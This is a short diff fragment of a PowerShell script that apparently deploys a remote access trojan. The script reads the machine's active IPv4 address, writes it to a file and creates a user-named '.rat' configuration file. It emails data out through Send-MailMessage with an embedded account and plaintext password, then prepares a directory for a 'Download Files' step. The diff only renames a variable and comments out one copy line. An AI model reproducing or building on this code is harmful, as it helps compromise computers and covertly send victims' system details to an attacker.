@@ -29,8 +29,8 @@ $InterfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).Interfa
 $IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress
 
 # Save IP Address to File
-$ipFilePath = "$INITIALPATH\ip.txt"
-$IP | Out-File -FilePath $ipFilePath
+$ipFile = "$INITIALPATH\ip.txt"
+$IP | Out-File -FilePath $ipFile
 
 # Create Configuration File
 $configfile = "$env:UserName.rat"
@@ -56,11 +56,12 @@ Send-MailMessage `
     -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))
 
 # Copy and Remove Configuration File
-Copy-Item -Path $ipFilePath -Destination $path
+#Copy-Item -Path $ipFile -Destination $path
 Remove-Item -Path $configfile
 
 # Create and Change to Working Directory
 mkdir $path
+
 cd $path
 
 # Download Files
